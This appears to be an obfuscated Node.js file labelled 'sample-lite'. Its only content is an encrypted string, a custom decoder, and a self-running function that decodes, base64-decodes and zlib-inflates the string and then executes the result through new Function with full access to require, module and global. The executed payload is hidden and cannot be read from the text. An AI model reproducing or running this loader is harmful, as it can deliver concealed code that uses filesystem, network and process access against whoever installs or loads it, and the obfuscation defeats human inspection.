`>/na_ZT?/(|q\"Ot6_ujc~?l!+Sn3/TkuuCwJ)>b*\\DCep,t*F`~57+6{U.EAqA?K~<#jkm/i5x}qm52c.)\\XIfXox9MYuKU<E}3>oAq8 xOq0Lv,-<67R'{(j's[+pcTeP2=[4'[lruWr&k\\Rt5*9m;;#|<\\gMSH>k1LQW,tKUT!M}}xPaVQVMrsF[7^z<i3Ay^EurDsqy8|)wkv'nX{\\O[{!h=%b`5J2l%4zpfor-O8=gaKho`yf|.{z>-4`!!*1-?N[Ja#_/&`A|`Jb2W'CRi(Qp@zveq<ay'RQ}_Dm{]=N{QO*9:)?:urmI2i+\"?ys:@(besvM{ZlqQr{ejD0O9FAV$y+41`oT\\d[@XZ O8H$L](G*\"[r\\gwUuxwi]s<:%2YCj=E=auA=!'/3/!bvSUq4tL*Zr<pf13v'9y@pwP_6L^>i8^7r*jQ+@_$mts\"ycE45'Zl4V{ME>G[S&>f0wbV6AXSPQri~J5`.$TCYunDJ@\"kIhmSeVQ4SHP{^t*gzKdGKxNH`_5N.s\"9yE\"?K,\"|^YEm_hF8rl*4-g]cgS~lxK jSGTw6VAtN'D&o3VK_n@#Sd2Xz\\lM?eF >SrN)t7U/cJ*bd3y}1^4a;`jUEM-AX1@aX!R8nEMq0je+j`]OOfHx*jY.}$k[kc$qg%tu7P)(2#FAnDxM%UTba)nHm4Tcn'>,5prG4}]e.H(d%QCoMEI^pYYvC?I;X//,e\\vd1WPN:4#9>R9TFC08~dV,jgpoJ#~HfK^ib}6e,8S~|'=c-LFV%0Y\\Zl;gGSy%P'QV3kyX)p,Rw|X|KZpZ-hYZG&u?d[_~fR4m2g^RYbR^i)D~e3Y|lqjzKx`IQUbcfN2Dy~rT#;/8_=A?Jva>Z+>1]>F{'DJcF%}`a?7*u+)U7>L`.@Ejf*X3>D_xHjr9974Ng;,nZ6>^m[V2S[:)vwM2^Nqq-3np3|W,LBJY\\,t(TMt%]^GJ?0DL/7fqQ*YqFf!VIrls4WO.5^)nc OmEbf+|*%OD^_?[p>hVyRkg$oluPP&23.(Dyw&v*3)qz,$MWt(zo'+|iYE*11zQome{f?lhq=$9\\|Q_5Jo#hq9[m\\>r'7]Ju\\ yE-5P;T47q\"RE[Gd\"}]h6q,]^eH~KfwpZCvxur9Hpx7!E<Al&QJ8X<{{T$K>y>A\\DuJ7RK*?S)>;P!?CD<jf#Xx^t[dBZ~YEv`&r#}'hhG.`dmzV)_lC{2h4Tk=7xwGow \"p_/[->e[~+<(sJUBDIj`4)Ng>i3jf\"j/ADbdzN&drG]@ei=2[]uVaCz)>p/U}d'<tVIvH\\}dX,`=\\ms7^7%yH/ikjH_KwoX+x7EOdTw,)xz2n'sb#nnwE'c#rHC;Z&>?.Rj8(+}q7XXA30#_x:P-I]?0Yb`|,\"@8wPFuALa1v%!d[\"6$HI45b@l[C,6'#|7\\a>Hgb3#7[2^dw\"y9vH0&tL=DM:^GO>@5B%.&J&ZX}0?l}j^0|cFgI5'38HFT-U\"yZUp/$E hYK6C__rgi}'7S*hUPVUu'z.TV4(dS<yV+~M|\"*\\xQ_%_ hIUzSW%t#)jGy\"kxt%'%egw{,0MctzNw/dZX6;d|h+vT/Cohi1),j=yrc)[<W/E$Pe*#UTo!`r,memXEChU7?2wC#!-]le`,=HccA@R{8Cp&ryD?fs[('K24s0;Nbx7JJdC)31EZMs+u5lJTSAk!C`Y/\"Q$!TH49$)[~=-}%z=6HeCpv_&0P:f_|f.WqS+td?qt8^s!J\\\\,86 4`;-FZL_7Jl&*-OT|VLv}yk?(vrN;$F@mfS[sDV|Mhyqq,'k%~ylf%Z:GW:i=W{;v)kye0Ne+NAgWm}P<1g9Ptr)8jl_toA*<.>,Gp5<lS3_Dz&|^w/{Bz#QfyrO@5I])>7tK*Fe|C2'[2^~YEMAZeyd#i'%Q<*S5sY.M:)/q`x$5!K\\lZ)1\\tIR{B!|C:R6BU.{g3:a,n8U)04y2d]0b,QhyeO;JtyE(:5.=uBtzxEx77z;Jao!9Cpv0h/;2|2ux2W5hpLqJRv9N7j(hy>,m-{j z0`yRF>R9k>dxGNd2<JJ=EX1~K:5%>Q%p6Tf>Wx8b<w[Woh]:xBDNeC5kQb>Ik[yK I[OB^mum(m80cr N^p:Y!^<|W<qh2~4&E(z(2j,o):>:s(tR%O7P5fVd]LOsgg%^>.-So 1=|XNAON(#d]*8(6p8<Q()xxtLq$IGVON{WEhLln?}dwVgK.%~7X$~Y(4miSeB{!RkO/WTy,lAe#zzb?\\j]%E@.t9AxNtL\\=K|7lWPF]R{5f;9M.tC%fhXI[ZmS_/t#ncLkDjURB/O'</UH_ |IjyIjeIR-pEDpl{F1mx%EFYmwgo:u3Z`}vuUgsks8h5LyDzvl\"|[q%$OVQI3[3%1QG>:+rmUOXfiDUd`.vnxZX;TwJhW35rxuf3hrIZ4Tf9JKw}9\\gBHT!,[:Hpo5lh_9b{D|S*$.jJp*tZ?XgiE0Zz'n7%87E|2Wgq5vM-TxXg[GU(ONt/<oP4pKY1TysN)\"M&MZbF]+#z=.^\\L3\\1U5+G|bIberbbu'P{V*bt,Z`CpINj4Y$<}x<R S=Yn:ybwC806)Sw-2-!1T0f<nkualGk;^EOm!^<O9bn?|3Ivj-4Rt\"OZoL~*n4*%u|hVH,8? %vk:X(>QZ#K1}Ipz2BY,u0n|CpEO6u^eKt(1+qq*!E|Q eC)N`~&nO s4A4witPmRKMn's\"u]qH.sDiAz`W(hHt;YZ,\\}yC1bO0(8T*\"q,x]y\\B;'\\!fwiPn2<SW@(y]R({4u pe&/P3oeaqgYp6;_~}ptIt7m~x@8me<is%B93wmC{G0]uLcCpFCf1rQR@lSly@_{|A&_^c/R*6tEb1$oBVhG3XpV=&H%%N.IX=B9*TK_!S`H(w/AbQ^k.OO[KJZnzjpR)Tp2Ii?i<91)S^UwXxX-V,RR rM4HjEc2t/p+)+'vh_E#X1v/zjd%_Iw_A\\4h3tK3V<\\EqQYJq=`+d*gou^J(4Zz)>\\]kbm:^31X\\Em&7jtsTD~:o+U\\UD*-V!{cFZ+{-pV~0EtW+F.Z-tu'e\\FB#jYD+8/8cE/nURrAkf//t01Qzo# F:&,uN-O=u!I k<,\"?n5`*u1|EgZub6t0?'UdNn\"y/ TSyO&9n-zf4-')\\yx4|W/slIs&a]moN5\"8KpFH;9p;eWGo=QRT+H?siExB.Vo?<I)#'}~6xfL^p={Z++]H@K,jK3{Xt#?gdUWH@ z=)y6b?xW{z\":3~j_mFVXLU;-k~Cg^RxM?[`,z+.tyO!mas&uvpsW*(HWFF7,3ch\"{6i^4=l1n\"!9l'9k\\436CU$b%1\"j*OdSA!p$\"GiqOMJO_0NrGqPp{i;G|j,E8gB9]$)Yd!Bwd&T>$D@YX[[1[`Ps;T.`{wTkLIMpQ:0Fi7;o:J8w`|L)mGNb>t=&l-?QjLZMpz:Z2z'Ew6>~^mMH53M/gBX+@U\"w\"Om4=58'1Q~FtU%7_Akb\\_x0 b~T\"x}/|_M/^=sFC6Swf\\}@\\/pt?J==O6o4$-ZV'daJ7M4'W5<> cj3bb:m6qlV8yQrD{RG\\LP@!O ZV}VG*K1b7Fy\"L7a&TBdQ=}1GX0U5k_x?P%=4j;p&kof4|:Co5  6EZ-j2l=BJMEqr}?x:PJ)8.u0dtgV,u(.L7Em`_4p1fR[yn[BTDcCH%(m^~c}QyUkH#M[V<uUC&21XCq+Y]NTv4G9{SiI+H*E*-nhUIPN]\"?+90L_oFPPxhKJ<:H\"dN=_{`!Q!S5(QcKE:\\ZcutE=<Iu\\VWUUt5X-G=nU=&aH`y7Wy6O>!rfo?;K!Eob6d`N(vT\"T#6<ql]BV+[Gp\"\\w9f4Th/9Pr*%5ZFPt.g<F*)\"";function gr5Rp1a(LEvvyh,mmqSey,gr5Rp1a){for(var m_x8_P="",oQEuyFW=0x0;oQEuyFW<gr5Rp1a;oQEuyFW++){LEvvyh=LEvvyh+0x9e3779b9|0x0;var OoR_Qj=((LEvvyh^LEvvyh>>>0xd)%0x5f+0x5f)%0x5f,rsd7Zi=WiuZ9wt.charCodeAt(mmqSey+oQEuyFW)-0x20,kXYNiAj=((rsd7Zi-OoR_Qj)%0x5f+0x5f)%0x5f;m_x8_P+=String.fromCharCode(kXYNiAj+0x20)}return m_x8_P}function rsd7Zi(){return 0};(function(){var _b64=gr5Rp1a(0x243f6a88,0x0,0x1800);var _g=typeof globalThis!=='undefined'?globalThis:(typeof global!=='undefined'?global:this);var _req;try{_req=typeof require==='function'?require:null;}catch(e){}if(!_req||typeof Buffer==='undefined'){throw new Error('sample-lite needs Node');}var _src=_req('zlib').inflateSync(Buffer.from(_b64,'base64')).toString('utf8');(new Function('require','module','global',_src)).call(_g,_req,typeof module!=='undefined'?module:{exports:{}},_g);})();
